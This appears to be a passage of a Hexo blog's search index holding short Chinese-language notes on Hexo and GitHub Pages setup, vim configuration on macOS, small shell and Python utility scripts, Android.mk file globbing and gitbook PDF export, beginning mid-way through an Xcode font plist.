1</string>\n\t</dict>\n\t<key>DVTSourceTextSyntaxFonts</key>\n\t<dict>\n\t\t<key>xcode.syntax.attribute</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.character</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.comment</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.comment.doc</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.comment.doc.keyword</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.class</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.class.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.constant</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.constant.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.function</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.function.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.macro</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.macro.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.type</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.type.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.variable</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.identifier.variable.system</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.keyword</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.number</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.plain</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.preprocessor</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.string</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t\t<key>xcode.syntax.url</key>\n\t\t<string>Menlo-Regular - 12.0</string>\n\t</dict>\n</dict>\n</plist>\n```","tags":["xcode"],"categories":["软件"]},{"title":"hexo搭建博客","url":"%2Fp%2Fb37651.html","content":"\n### 1. 安装hexo\n\n+ 安装node.js\n+ 安装hexo\n\n\t```\n\tnpm install -g hexo-cli\n\tmkdir hexo\n\thexo init hexo\n\tcd hexo\n\t```\n\n<!-- more -->\n\n### 2. hexo配置\n\n+ 因为主站有个配置, 主题也有个配置, 建议两个配置合并一起, 需要Hexo版本在 3 以上\n\n+ 在站点的 `source/_data` 目录下新建 `next.yml` 文件（`_data`目录可能需要新建）迁移站点配置文件和主题配置文件中的配置到 `next.yml` 中(包含了`_config.yml`和`theme.yml`)\n  \n\t```\n\thexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml\n\t```\n\t\n+ 不渲染 README\n\n  将skip_render参数的值设置上。skip_render: README.md\n  使用hexo d 命令就不会在渲染 README.md 这个文件了。\n\n\n\n### 3. github pages + 绑定域名\n\n+ 为自己的 github 生成一个公钥私钥对\n\n+ 建立带用户名的仓库 unix2dos.github.io\n\n- CNAME 放到 source 文件夹, 里面写上 www.liuvv.com\n- 向你的 DNS 配置中添加 3 条记录\n\n```\n@          A             192.30.252.153\n@          A             192.30.252.154\nwww      CNAME           unix2dos.github.io.\n```\n\n\n\n### 4. 常用命令\n\n```html\nhexo clean --config source/_data/next.yml && hexo g -d --config source/_data/next.yml\n\n---\ntitle: \"\"\ndate: 2018-05-19 17:54:46\ntags:\n- golang\n- linux\n---\n\n<!-- more -->\n\n\n![1](Kademlia_DHT_KRPC_BitTorrent协议/1.png)\n```\n\n\n\n### 5. 同步hexo\n\n```shell\nnpm install hexo --save\nnpm install hexo-deployer-git --save\n\nnpm ls --depth 0  //查看丢失的包\nnpm install hexo-generator-archive --save //逐一安装缺失的包\n\n\n### hexo-next 主题\n\n# 第一台电脑\ncd themes\ngit submodule add https://github.com/unix2dos/hexo-theme-next next\ncd next\n\n# 第二台电脑\ngit submodule update --init\ncd themes/next\n\n# 分享按钮\ngit clone https://github.com/theme-next/theme-next-needmoreshare2 source/lib/needsharebutton  \n\n# 丝带\ngit clone https://github.com/theme-next/theme-next-canvas-ribbon source/lib/canvas-ribbon\n\n# 蜘蛛网\ngit clone https://github.com/theme-next/theme-next-canvas-nest source/lib/canvas-nest\n\n# 三种特效\ngit clone https://github.com/theme-next/theme-next-three source/lib/three \n\n# 特殊汉字\ngit clone https://github.com/theme-next/theme-next-han source/lib/Han\n\n# 快速点击\ngit clone https://github.com/theme-next/theme-next-fastclick source/lib/fastclick\n\n# 懒加载\ngit clone https://github.com/theme-next/theme-next-jquery-lazyload source/lib/jquery_lazyload\n\n# 顶部的进度\ngit clone https://github.com/theme-next/theme-next-pace source/lib/pace \n\n# 图片展示\ngit clone https://github.com/theme-next/theme-next-fancybox3 source/lib/fancybox \n\n# 文字显示加空格\ngit clone https://github.com/theme-next/theme-next-pangu.git source/lib/pangu\n\n# 读取进度\ngit clone https://github.com/theme-next/theme-next-reading-progress source/lib/reading_progress \n\n\n### hexo-next 插件\n\n1. npm install hexo-symbols-count-time --save   # 统计字数\n\nsymbols_count_time:\n  symbols: true\n  time: true\n  total_symbols: true\n  total_time: true\n  separated_meta: true\n  item_text_post: true\n  item_text_total: false\n  awl: 4\n  wpm: 275\n\n\n2. npm install hexo-abbrlink --save # 链接持久\n\npermalink: post/:abbrlink.html\nabbrlink:\n  alg: crc16 #support crc16(default) and crc32\n  rep: hex    #support dec(default) and hex\n  \n  \n3. npm install hexo-auto-category --save #自动分类\n\nauto_category:\n enable: true\n depth:\n \n \n4. npm install hexo-generator-searchdb --save # 本地搜索\n\nsearch:\n  path: search.json\n  field: post\n  format: html\n  limit: 10000\n  content: true\n  \n#然后打开本地local_search\nlocal_search:\n\tenable: true\n  \n\n5.  gittalk评论系统(禁止使用, 建议使用 disqus)\n\nhttps://github.com/theme-next/hexo-theme-next/pull/464\nhttps://asdfv1929.github.io/2018/01/20/gitalk/\nhttps://github.com/settings/developers\n\nHomepage URL 和 Authorization callback URL 都填写自己配置的域名\n```\n\n\n\n### 6. 问题解决方案\n\n1. 生成页面如果空白的话, 换个主题再重新生成一次\n\n2. WARN  No layout\n\n   看看主题里面究竟有没有东西,文件夹名字和主题是否对应\n   \n3. 使用链接持久后图片无法显示(https://github.com/rozbo/hexo-abbrlink/issues/19)\n\n   ```javascript\n   # vi node_modules/hexo-asset-image/index.js     #24行\n   \n   // var endPos = link.length-1; // 换成下面的这句话\n   var endPos = link.length-5; //因为我的permalink: p/:abbrlink.html,  这里要改成-5\n   ```\n   \n\n\n\n### 7. 参考资料\n\n+ https://iuok.me/posts/3159684541/ 插件\n","tags":["hexo"]},{"title":"shell批量文件内容复制到一个文件内","url":"%2Fp%2F875a198.html","content":"\n> 公司需要把所有代码放到一个文件内,加上版权信息. 于是用shell简单的处理了下\n\n```shell\n#!/bin/sh\n\nNAME=\"a.txt\"\nif [ -f $NAME ]; then\n\t`rm $NAME`\nfi\n\nDIR=\"\"\nFILE=\"\"\nfor file in `ls -R`\ndo\n\tif [ -f $file ]; then\n\t\tif [ $file = \"a.sh\" ];then\n\t\t\tcontinue\t\n\t\tfi\n#\t\techo \"===================== $file begin =====================\" >> $NAME\n#\t\t`cat $file >> $NAME`\n#\t\techo \"===================== $file end =====================\" >> $NAME\n\t\techo $file\t\t\n\telse \n\t\tif  [ ${file:0:1} = \".\" ];then\n\t\t\tDIR=${file/://}\n\t\telse  \n\t\t\tif [ \"$DIR\" != \"\" ] && [ ${DIR:0:6} = \"./base\" ];then\n\t\t\t\tcontinue #此处可以过滤不想要的文件夹\t\n\t\t\tfi\n\t\t\tFILE=$DIR$file\n\t\t\tif [ -f $FILE ]; then\n\t\t#\t\techo \"===================== $file begin =====================\" >> $NAME\n\t\t#\t\t`cat $FILE >> $NAME`\n\t\t#\t\techo \"===================== $file end =====================\" >> $NAME\n\t\t\t\techo $FILE\n\t\t\tfi\n\t\tfi\n\tfi\ndone\n```\n","tags":["shell"],"categories":["shell"]},{"title":"python使用正则后向引用替换字符串","url":"%2Fp%2F136fd428.html","content":">工作需要把 `Mud makes my mom mad.` 这句话带有m的加上颜色,或者把某些单词加上颜色\n>临时写了个脚本处理\n\n```python\nimport re\nimport sys\n\n\n# replace letter\n#find = \"m\"\n#str = \"Mud makes my mom mad.\"\n\n#replace key words\n#find = \"Mud|makes|mad\"\n#str  = \"Mud makes my mom mad.\"\n\n# how to use\n# python b.py \"m\"\t\"Mud makes my mom mad.\" \n# python b.py \"mud|mess|mop|make|the|help\"\t\"Mud makes my mom mad.\"\n\n\nfind  = sys.argv[1] \nstr   = sys.argv[2] \n\n\nresult = re.sub(r'('+find+')', r'<color:#ff0000>\\1</color>', str, 0, re.IGNORECASE)\nprint result\n\n```\n","tags":["python"],"categories":["python"]},{"title":"mac系统vim升级流程","url":"%2Fp%2F4ea69092.html","content":"\n#### 执行命令安装vim 注意要加上`--with-override-system-vi`\n```bash\nbrew install vim --with-override-system-vi\n```\n\n\n#### 安装过程中如果出现 ruby.h找不到\n\n执行下面的命令\n\n```bash\ncd /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.11.sdk/System/Library/Frameworks/Ruby.framework/Versions/2.0/usr/include/ruby-2.0.0/ruby\n```\n\n```bash\nsudo ln -s ../universal-darwin15/ruby/config.h ./config.h\n```\n注意不要复制上面的, 对应自己的sdk版本,ruby版本,darwin版本\n\n\n<!-- more -->\n#### 给自己的vim做个别名, 注意自己vim的版本路径\n\n```bash\nalias vim=\"/usr/local/Cellar/vim/7.4.2152/bin/vim\"\n```\n\n\n\n#### 升级vim后如果主题不显示\n把自己主题文件放到这个 `/usr/local/Cellar/vim/7.4.2152/bin/vim`里\n\n\n#### 让git也适应最新的vim\n\n```bash\ngit config --global core.editor /usr/local/Cellar/vim/7.4.2152/bin/vim\n```\n\n\n--------\n\n## 另外一种方案, 安装macvim\n\nInstall the latest version of MacVim. Yes, MacVim. And yes, the latest.\n\nIf you don't use the MacVim GUI, it is recommended to use the Vim binary that is inside the MacVim.app package (MacVim.app/Contents/MacOS/Vim). To ensure it works correctly copy the mvim script from the MacVim download to your local binary folder (for example /usr/local/bin/mvim) and then symlink it:\n\n\n\n```\nalias vim=\"/Applications/MacVim.app/Contents/MacOS/Vim\"\ngit config --global core.editor /Applications/MacVim.app/Contents/MacOS/Vim\n```\n\nIt requires Vim 7.3.885 or later with Lua support (\"+lua\").\n```\nbrew install macvim --with-lua\n```\n","tags":["vim"],"categories":["软件"]},{"title":"golang配置vim","url":"%2Fp%2F3feff448.html","content":"### 配置文件和快速设置\n- [.vimrc][1]\n- [.zhsrc][2]\n[1]: https://github.com/unix2dos/go-tutorial/blob/master/.vimrc\n[2]: https://github.com/unix2dos/go-tutorial/blob/master/.zshrc\n\n1. PlugClean\n2. PlugInstall\n3. 去到YCM里执行\n```\n./install.py --clang-completer --gocode-completer\n```\n\n\n### 安装插件管理器\n```bash\ncurl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n```\n\n### 安装插件\n```bash\ncall plug#begin()\nPlug 'fatih/vim-go' \"go\nPlug 'tomasr/molokai' \"主题\nPlug 'SirVer/ultisnips' \"tab补全\nPlug 'ctrlpvim/ctrlp.vim' \"快速查文件\nPlug 'Shougo/neocomplete.vim' \"实时提示\nPlug 'majutsushi/tagbar' \"tagbar\nPlug 'scrooloose/nerdtree' \"导航\nPlug 'vim-airline/vim-airline' \"下面\ncall plug#end()\n```\n<!-- more -->\n\n###  安装go tools需要的东西﻿\n直接使用`:GoInstallBinaries`安装\n如果网络不行(你懂的), 把代理把包都下载下来\n\n```bash\ngit clone https://go.googlesource.com/tools  \n```\n\n\n### goTags需要安装ctags\n\n```bash\nbrew install ctags\n```\n﻿\n\n### 代码实时提示neocomplete, 需要vim支持lua\n```bash\nbrew uninstall vim\nbrew install luajit\nbrew install vim --with-luajit\n```\n\n\n### Gocode autocomplete non imported packages\n```\ngocode set unimported-packages true\n```","tags":["vim"],"categories":["golang"]},{"title":"python读取文件去除html_xml标签","url":"%2Fp%2Ff3ea3847.html","content":"\n> 自己写的一个简单去除html标签(xml)的脚本\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<text font=\"Palatino Linotype\">\n<p>\n<s end_audio=\"262\" start_audio=\"13\">\n<w end_audio=\"94\" id=\"0\" start_audio=\"13\" variants=\"mud\">Mud</w>\n<w end_audio=\"122\" id=\"1\" start_audio=\"95\">makes</w>\n<w end_audio=\"140\" id=\"2\" start_audio=\"123\">my</w>\n<w end_audio=\"215\" id=\"3\" start_audio=\"141\">mom</w>\n<w end_audio=\"262\" id=\"4\" start_audio=\"216\" variants=\"mad\">mad.</w>\n</s>\n</p>\n</text>\n```\n\n```python\nimport re\nimport sys\n\n# how to use\n# pythone a.py C6M01B1-001.xml\n\nfile = sys.argv[1]\nf = open(file, 'r')\n\nres = \"\"\nfor line in f.readlines():\n\t#str = re.sub(r'</?\\w+[^>]*>','',line)\n\tstr = re.sub(r'<(/|\\?)?\\w+[^>]*>','',line)\n\tif str != '\\r\\n':\n\tres = res + str\n\tres = re.sub('\\r\\n',' ',res)\n\tprint res\n#print \"len =\",len(res)\n```\n","tags":["python"],"categories":["python"]},{"title":"markdown语法集合","url":"%2Fp%2F1ef7af3b.html","content":"\n\n> This is a blockquote.\n> \n> This is the second paragraph in the blockquote.\n>\n> ## This is an H2 in a blockquote\n\n\n\nSome of these words *are emphasized*.\n\nUse two asterisks for **strong emphasis**.\t\n\n<!-- more -->\n\t\t\n\t\t\t\t\t\n- Candy.\n- Gum.\n- Booze.\n\n\t\t\n1. Red\n2. Green\n3. Blue\n\n\nThis is an [example link](http://example.com/)\n\nI get 10 times more traffic from [Google][1] than from\n[Yahoo][2] or [MSN][a].\n\n[1]: http://google.com/ \"Google\"\n[2]: http://search.yahoo.com/ \"Yahoo Search\"\n[a]: http://search.msn.com/ \"MSN Search\"\n\n\n\n\n![alt text](/images/a.jpg \"Title\")\n\n![alt text][id]\n\n[id]: /images/a.jpg \"Title\"\n\n\nI strongly recommend against using any `<blink>` tags.\n\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86   \n    src=\"http://music.163.com/outchain/player?type=2&id=25706282&auto=0&height=66\">  \n</iframe> \n\n<iframe   \n    height=498 width=510   \n    src=\"http://www.iqiyi.com/v_19rr9nypk0.html\"\n    frameborder=0 allowfullscreen>  \n</iframe>  \n\n\n| Tables        | Are           | Cool  |\n| ------------- |:-------------:| -----:|\n| col 3 is      | right-aligned | $1600 |\n| col 2 is      | centered      |   $12 |\n| zebra stripes | are neat      |    $1 |\n\n","tags":["markdown"],"categories":["计算机基础"]},{"title":"android自动添加文件到android-mk","url":"%2Fp%2F99b8fe68.html","content":"\n将\n```bash\nLOCAL_SRC_FILES := hellocpp/main.cpp \\  \n                   ../../Classes/AppDelegate.cpp \\  \n                   ../../Classes/HelloWorldScene.cpp \n```\n换成\n\n```bash\nFILE_LIST := hellocpp/main.cpp    \nFILE_LIST += $(wildcard $(LOCAL_PATH)/../../Classes/*.cpp)    \nLOCAL_SRC_FILES := $(FILE_LIST:$(LOCAL_PATH)/%=%)   \n```\n\n----\n\n<!-- more -->\n**另外一种方法:**\n\n```bash\n#遍历目录及子目录的函数  \ndefine walk  \n    $(wildcard $(1)) $(foreach e, $(wildcard $(1)/*), $(call walk, $(e)))  \nendef  \n  \n#遍历Classes目录  \nALLFILES = $(call walk, $(LOCAL_PATH)/../../Classes)  \nFILE_LIST := hellocpp/main.cpp  \n#从所有文件中提取出所有.cpp文件  \nFILE_LIST += $(filter %.cpp, $(ALLFILES))  \nLOCAL_SRC_FILES := $(FILE_LIST:$(LOCAL_PATH)/%=%)\n```\n","tags":["android"],"categories":["android"]},{"title":"gitbook--制作pdf","url":"%2Fp%2F1f9c8aa6.html","content":"\n## 命令行:\ngitbook pdf Effective-Modern-Cpp-Zh  myname.pdf\n\n\n\n### 如果无法生成 需要安装 calibre  \n\n安装后还要执行命令\nln -s /Applications/calibre.app/Contents/MacOS/ebook-convert /usr/local/bin\n\n","tags":["others"],"categories":["git"]},{"title":"我的第一篇博客","url":"%2Fp%2Fd95d7e09.html","content":"\n我的第一篇博客,写点什么好呢? \n希望以后能坚持写下去把.\n","tags":["others"],"categories":["个人记录"]}]